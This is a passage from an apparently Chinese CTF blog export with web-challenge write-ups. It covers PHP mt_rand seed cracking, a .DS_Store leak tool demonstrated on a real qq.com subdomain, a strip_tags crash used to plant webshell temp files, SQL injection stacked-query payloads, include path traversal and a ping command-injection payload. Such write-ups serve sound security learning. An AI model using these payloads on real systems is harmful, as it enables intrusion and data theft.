或者提交已知的多个随机数序列,使用方法为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">方法1: php_mt_seed xxx  这里xxx是用 mt_srand 播种后生成的第一个伪随机数</span><br><span class="line"></span><br><span class="line">方法2: php_mt_seed a1 b1 c1 d1 a2 b2 c2 d2 a3 b3 c3 d3  其中a1,b1为在某个范围内生成的随机数, c1,d1是生成随机数时mt_rand指定的生成范围</span><br><span class="line">例如第一次调用mt_rand(0,61) = 2 第二次调用mt_rand(0,61) = 30</span><br><span class="line">那么这里就是php_mt_seed 2 2 0 61 30 30 0 61</span><br></pre></td></tr></table></figure><p>那么使用脚本将目前已知的串转化为上面的形式</p><p>实际使用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/php_mt_seed-4.0]</span><br><span class="line">└─$ ./php_mt_seed 2 2 0 61 7 7 0 61 2 2 0 61 53 53 0 61 14 14 0 61 28 28 0 61 48 48 0 61 19 19 0 61 42 42 0 61 35 35 0 61        </span><br><span class="line">Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62</span><br><span class="line">Version: 3.0.7 to 5.2.0</span><br><span class="line">Found 0, trying 0xfc000000 - 0xffffffff, speed 1526.3 Mseeds/s </span><br><span class="line">Version: 5.2.1+</span><br><span class="line">Found 0, trying 0x0e000000 - 0x0fffffff, speed 61.6 Mseeds/s </span><br><span class="line">seed = 0x0f8bea05 = 260827653 (PHP 7.1.0+)</span><br><span class="line">Found 1, trying 0xfe000000 - 0xffffffff, speed 57.9 Mseeds/s </span><br><span class="line">Found 1</span><br></pre></td></tr></table></figure><p>这里爆出的种子是 <code>260827653</code>,那么我们再自己拿<code>mt_srand(260827653)</code>来生成种子,再生成随机数, 每次生成出来的数也是一样的</p><hr><h1 id="KOA"><a href="#KOA" class="headerlink" title="KOA"></a>KOA</h1><p>是一个用于处理网站静态文件的框架, 了解了之后再补充</p><p>有一个关键的路径为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...../Controllers/api.js</span><br></pre></td></tr></table></figure><h1 id="ds-store文件泄露"><a href="#ds-store文件泄露" class="headerlink" title=".ds_store文件泄露"></a><code>.ds_store</code>文件泄露</h1><blockquote><p><code>.DS_Store</code>是Mac下Finder用来保存如何展示 文件&#x2F;文件夹 的数据文件，每个文件夹下对应一个。由于开发&#x2F;设计人员在发布代码时未删除文件夹中隐藏的<code>.DS_store</code>，<strong>可能造成文件目录结构泄漏、源代码文件等敏感信息的泄露</strong>。</p></blockquote><p>在SQL注入中的利用: <a href="a65f6ebf.html">Comment</a></p><p>如果在网站目录中扫描到了未被删除的<code>.DS_Store</code>文件, 可以使用<a href="https://github.com/lijiejie/ds_store_exp">ds_store_exp</a>工具来利用, 解析<code>.DS_Store</code>文件并将目录下的文件递归下载到本地</p><p>用法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store</span><br><span class="line"></span><br><span class="line">hd.zj.qq.com/</span><br><span class="line">└── themes</span><br><span class="line">    └── galaxyw</span><br><span class="line">        ├── app</span><br><span class="line">        │   └── css</span><br><span class="line">        │       └── style.min.css</span><br><span class="line">        ├── cityData.min.js</span><br><span class="line">        ├── images</span><br><span class="line">        │   └── img</span><br><span class="line">        │       ├── bg-hd.png</span><br><span class="line">        │       ├── bg-item-activity.png</span><br><span class="line">        │       ├── bg-masker-pop.png</span><br><span class="line">        │       ├── btn-bm.png</span><br><span class="line">        │       ├── btn-login-qq.png</span><br><span class="line">        │       ├── btn-login-wx.png</span><br><span class="line">        │       ├── ico-add-pic.png</span><br><span class="line">        │       ├── ico-address.png</span><br><span class="line">        │       ├── ico-bm.png</span><br><span class="line">        │       ├── ico-duration-time.png</span><br><span class="line">        │       ├── ico-pop-close.png</span><br><span class="line">        │       ├── ico-right-top-delete.png</span><br><span class="line">        │       ├── page-login-hd.png</span><br><span class="line">        │       ├── pic-masker.png</span><br><span class="line">        │       └── ticket-selected.png</span><br><span class="line">        └── member</span><br><span class="line">            ├── assets</span><br><span class="line">            │   ├── css</span><br><span class="line">            │   │   ├── ace-reset.css</span><br><span class="line">            │   │   └── antd.css</span><br><span class="line">            │   └── lib</span><br><span class="line">            │       ├── cityData.min.js</span><br><span class="line">            │       └── ueditor</span><br><span class="line">            │           ├── index.html</span><br><span class="line">            │           ├── lang</span><br><span class="line">            │           │   └── zh-cn</span><br><span class="line">            │           │       ├── images</span><br><span class="line">            │           │       │   ├── copy.png</span><br><span class="line">            │           │       │   ├── localimage.png</span><br><span class="line">            │           │       │   ├── music.png</span><br><span class="line">            │           │       │   └── upload.png</span><br><span class="line">            │           │       └── zh-cn.js</span><br><span class="line">            │           ├── php</span><br><span class="line">            │           │   ├── action_crawler.php</span><br><span class="line">            │           │   ├── action_list.php</span><br><span class="line">            │           │   ├── action_upload.php</span><br><span class="line">            │           │   ├── config.json</span><br><span class="line">            │           │   ├── controller.php</span><br><span class="line">            │           │   └── Uploader.class.php</span><br><span class="line">            │           ├── ueditor.all.js</span><br><span class="line">            │           ├── ueditor.all.min.js</span><br><span class="line">            │           ├── ueditor.config.js</span><br><span class="line">            │           ├── ueditor.parse.js</span><br><span class="line">            │           └── ueditor.parse.min.js</span><br><span class="line">            └── static</span><br><span class="line">                ├── css</span><br><span class="line">                │   └── page.css</span><br><span class="line">                ├── img</span><br><span class="line">                │   ├── bg-table-title.png</span><br><span class="line">                │   ├── bg-tab-say.png</span><br><span class="line">                │   ├── ico-black-disabled.png</span><br><span class="line">                │   ├── ico-black-enabled.png</span><br><span class="line">                │   ├── ico-coorption-person.png</span><br><span class="line">                │   ├── ico-miss-person.png</span><br><span class="line">                │   ├── ico-mr-person.png</span><br><span class="line">                │   ├── ico-white-disabled.png</span><br><span class="line">                │   └── ico-white-enabled.png</span><br><span class="line">                └── scripts</span><br><span class="line">                    ├── js</span><br><span class="line">                    └── lib</span><br><span class="line">                        └── jquery.min.js</span><br><span class="line"></span><br><span class="line">21 directories, 48 files</span><br></pre></td></tr></table></figure><h1 id="PHP伪协议string-strip-tags带来的bug"><a href="#PHP伪协议string-strip-tags带来的bug" class="headerlink" title="PHP伪协议string.strip_tags带来的bug"></a>PHP伪协议string.strip_tags带来的bug</h1><p>这里的PHP版本为7.033, 有一个bug是:</p><blockquote><p>使用<code>php://filter/string.strip_tags</code>导致<code>php</code>崩溃清空堆栈重启，如果在同时上传了一个文件，<strong>那么这个<code>tmp file</code>就会一直留在<code>tmp</code>目录</strong>，再进行文件名爆破就可以getshell。这个崩溃原因是存在一处空指针引用。</p><p>可用版本:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</span><br><span class="line">&gt;• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</span><br><span class="line">&gt;• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</span><br></pre></td></tr></table></figure></blockquote><p>那么利用这里漏洞,需要在通过文件包含使用<code>php://filter/string.strip_tags</code>的同时, 上传一个文件,这个文件将会被保存在<code>/tmp</code>目录下. 然后通过访问<code>dir.php</code>获得上传文件的文件名就可以了</p><p>可以通过脚本来实现传参+上传文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://faf05418-21ed-4937-a2e0-0ba79a558d01.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"></span><br><span class="line">phpfile = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>  <span class="comment">#这里是测试,换成一句话木马也可</span></span><br><span class="line">filedata = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: phpfile</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bak = requests.post(url=url, files=filedata)</span><br><span class="line"><span class="built_in">print</span>(bak.text)</span><br></pre></td></tr></table></figure><p>运行之后,只要直到<code>/tmp</code>目录下被上传的文件名,就能够访问并执行了</p><p>题目:<a href="a65f6ebf.html">ezinclude</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf_web刷题记录_PART1</title>
      <link href="/post/2e610037.html"/>
      <url>/post/2e610037.html</url>
      
        <content type="html"><![CDATA[<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>简单的SQL注入:</p><p>尝试在用户名栏输入<code>admin&#39;</code>提示SQL语句报错，说明存在注入漏洞</p><p>那么在用户名栏输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27; #</span><br></pre></td></tr></table></figure><p>这里<code>&#39;1&#39;=&#39;1&#39;</code>是一个恒真的条件, <code>#</code>使得后面的其他语句失效</p><p>密码随便输入一个,点击登录后就能够看到flag了</p><img src="/images/buuctf-web/image-20221012200717515-16670478197331.png" alt="image-20221012200717515" style="zoom:67%;" /><br><hr><br><h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF_2018]WarmUp"></a>[HCTF_2018]WarmUp</h1><p>打开页面是一个滑稽脸,查看源码可以发现<code>source.php</code></p><p>访问这个文件,得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];<span class="comment">//白名单</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>( //返回给定字符串的一部分,<span class="number">0</span>是起始位置,第三个参数是返回的长度</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//此函数返回问号在page中第一次出现的位置</span><br><span class="line">            );<span class="comment">// 此函数相当于截断了$_page中问号后面的部分</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            ); </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])&amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])&amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])) &#123; <span class="comment">// 要求参数file的值非空, 是字符串,且通过checkFile函数的检测</span></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问一下代码里提示的另一个文件 <code>hint.php</code>, 提示flag在<code>ffffllllaaaagggg</code>中</p><img src="/images/buuctf-web/2.png" alt="2" style="zoom:67%;" /><p>代码中,第8行的第一个<code>if</code>判断是否传入参数,以及参数值是否是字符串</p><p>12行第二个<code>if</code>直接判断参数值是否在白名单里,如果传<code>file=hint.php</code>这里将会直接判断为True,函数返回,并<code>include</code>参数值,但是这样无法读取到<code>ffffllllaaaagggg</code>中的内容</p><p>15-18行截断了参数值第一个问号前面的部分, 20行将对这部分进行判断,如果在白名单内,函数也会返回.</p><p>如果想让函数在这里返回,那么参数<code>file</code>的值应为: <code>hint.php?其他内容</code></p><blockquote><p><strong>知识点补充:</strong></p><p><strong>对于<code>include</code>函数来说,如果它的参数中含有路径,那么它会按照参数给出的路径去寻找文件,也就是会包含最后一个<code>/</code>后面的文件</strong></p><p><strong>例如<code>include(hint.php?../../abc.php)</code>即使<code>hint.php</code>存在,<code>include</code>函数也会去尝试寻找并包含最后面的<code>abc.php</code></strong></p></blockquote><p>因此,可以构造payload: 不知道<code>ffffllllaaaagggg</code>在哪个目录,依次尝试就行,最后成功的payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>这里<code>hint.php</code>保证能够通过检测, 最后执行的include为,也就成功包含了<code>ffffllllaaaagggg</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(hint.php?../../../../../ffffllllaaaagggg)</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221012223735123.png" alt="image-20221012223735123" style="zoom:67%;" /><br><hr><br><h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p>很简单,查看源码就有提示</p><p>GET传一个<code>cat</code>参数,值为dog,flag就直接出来了</p><br><hr><br><h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>进来之后是一个链接,点击后发现使用GET中的<code>file</code>变量来包含了<code>flag.php</code></p><p>直接访问<code>flag.php</code>也是显示一样的内容: </p><img src="/images/buuctf-web/image-20221013151927649.png" alt="image-20221013151927649" style="zoom:67%;" /><p>说明这里存在文件包含漏洞,那么可以利用<code>php</code>伪协议来输出一下<code>flag.php</code>的源码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>将输出内容进行<code>base64</code>解码之后就得到了flag:</p><img src="/images/buuctf-web/image-20221013152041727-16670478197333.png" alt="image-20221013152041727" style="zoom:67%;" /><br><hr><br><h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>这里输入一个地址,后台服务器会<code>ping</code>这个地址,那么后台应该是把这里输入的地址拼接到命令中,那么这里应该也可以利用<code>&amp;</code>或<code>&amp;&amp;</code>执行其他命令</p><p><img src="/images/buuctf-web/image-20221013153002942.png" alt="image-20221013153002942"></p><p>查看下根目录有什么文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;ls /</span><br></pre></td></tr></table></figure><p>要素察觉<img src="/images/buuctf-web/image-20221013153511483-16670478197332.png" alt="image-20221013153511483" style="zoom:67%;" /></p><p>接下来输出一下这个文件的内容就看到flag了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;cat  /flag</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from `1919810931114514`</span><br><span class="line">73656c656374202a2066726f6d20603139313938313039333131313435313460</span><br><span class="line"></span><br><span class="line">1&#x27;;Set@payload=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execpayload from @payload;execute execpayload;#</span><br></pre></td></tr></table></figure><p>首先测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>成功输出</p><p>接下来使用<code>union</code>来尝试获得数据库的一些信息:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure><p>发现存在关键词过滤:</p><img src="/images/buuctf-web/image-20221013154743257.png" alt="image-20221013154743257" style="zoom:67%;" /><p>那么尝试使用不在黑名单里的<code>show</code>来爆库名,表名和列名:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br><span class="line">1&#x27;;show tables;#</span><br><span class="line">1&#x27;; show columns from words;#</span><br><span class="line">1&#x27;; show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221013155532680-16670478197334.png" alt="image-20221013155532680" style="zoom:67%;" /><img src="/images/buuctf-web/image-20221013155832825.png" alt="image-20221013155832825" style="zoom:67%;" /><blockquote><p><strong>知识点:</strong></p><p><strong>在表名为纯数字时,需要把表名用反引号包裹起来!!!!!</strong></p></blockquote><p>发现在名为<code>1919810931114514</code>的表中有一个名为flag的列,那么现在需要尝试获取这个列中的数据</p><p>下面是网上找到大佬使用的几种方法:</p><ul><li><strong>预处理查询语句</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;Set@payload=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execpayload from @payload;execute execpayload;#</span><br><span class="line">//这里先将本来想要执行的select * from `1919810931114514`进行16进制编码</span><br><span class="line">//然后使用Set语句将编码后的语句赋值给一个变量: Set@变量名=变量值</span><br><span class="line">//使用prepare语句对查询语句进行预处理,这个过程里会进行编码转换:prepare 预处理后的变量名 from @变量名</span><br><span class="line">//最后执行预处理后的语句:execute 预处理后的变量名</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221013171514886-16670478197335.png" alt="image-20221013171514886" style="zoom:67%;" /><br><ul><li><strong>使用<code>handler</code>语句</strong> 关于<code>handler</code>具体见<a href="94662ad7.html">这里</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;# </span><br><span class="line">//或者</span><br><span class="line">1&#x27;;HANDLER `1919810931114514` OPEN as a;HANDLER a READ FIRST;HANDLER a CLOSE;# </span><br><span class="line">//这里的逻辑是使用handler语句打开要查询的表,然后读取第一行数据后关闭</span><br></pre></td></tr></table></figure><ul><li><strong>修改表名</strong></li></ul><p>通过前面的查询,库中一共有<code>word</code>和<code>1919810931114514</code>,<code>word</code>表中包含<code>id</code>和<code>data</code>两列,那么正常输入数字查询出的数据应该来自这个表,那么可以设法使正常查询显示<code>1919810931114514</code>这个表中的内容.</p><p>如果正常的查询语句为<code>select id,data from word where id=xxx</code>,那么只需要让此语句指向另一个表中需要的数据就行了</p><ol><li><p>通过<code>rename</code>修改<code>word</code>的表名:<code>rename table words to aaa;</code></p></li><li><p>将<code>1919810931114514</code>的表名修改为<code>word</code>:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename <span class="keyword">table</span> `<span class="number">1919810931114514</span>` <span class="keyword">to</span> words</span><br></pre></td></tr></table></figure></li><li><p>修改该表中的列信息:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">add</span> id <span class="type">int</span> unsigned <span class="keyword">not</span> <span class="keyword">Null</span> auto_increment <span class="keyword">primary</span> key; <span class="keyword">alter</span> <span class="keyword">table</span> words change flag data <span class="type">varchar</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure></li></ol><p>那么完整的payload为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; rename table words to aaa; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure><p>最后只要输入1就可以查询到flag了:</p><img src="/images/buuctf-web/image-20221013175155502-16670478197338.png" alt="image-20221013175155502" style="zoom:67%;" /><br><hr><br><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1 有显示</span><br><span class="line">1&#x27; 无显示</span><br><span class="line">1122 and 1=1 # --nonono</span><br><span class="line">asb and 1=1 # --nonono</span><br><span class="line">1122 or 1=1 # --nonono</span><br><span class="line">asb or 1=1 # --nonono</span><br><span class="line">1;show databases;# 成功</span><br><span class="line">1;show tables;# 成功</span><br><span class="line">1;show columns from Flag; --nonono</span><br><span class="line">1;Set@a=0x73686f7720636f6c756d6e732066726f6d20466c61673b;prepare b from @a;execute b;# --nonono</span><br><span class="line">1;HANDLER flag OPEN as a;HANDLER a READ FIRST;HANDLER a CLOSE;#  --nonono</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221013180118069-16670478197336.png" alt="image-20221013180118069" style="zoom:67%;" /><img src="/images/buuctf-web/image-20221013184312188-16670478197337.png" alt="image-20221013184312188" style="zoom:67%;" /><p>经过测试可知: 数字型参数, 存在关键词过滤, flag大概率在<code>Flag</code>表里,但<code>Flag</code>在黑名单里面无法通过过滤</p><p>用BurpSuite的<code>Intruder</code>做一下<code>fuzz</code>测试,看看哪些字符不在过滤范围内,这里长度为507的说明服务器返回了<code>nonono</code>,也就是这些词被过滤了</p><img src="/images/buuctf-web/image-20221013185406308-16670478197339.png" alt="image-20221013185406308" style="zoom:67%;" /><p>通过测试, <code>#</code>,<code>;</code>等符号都还可以使用</p><p>另外发现,这里不管查询多大的数字,都会且仅会返回<code>Array ([0] =&gt;1)</code></p><p>根据<a href="https://blog.csdn.net/mochu7777777/article/details/108937396">https://blog.csdn.net/mochu7777777/article/details/108937396</a> 这里应该是进行了一次或运算</p><p>那么查询语句应该是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select &quot;.$post[&#x27;query&#x27;].&quot;||flag from 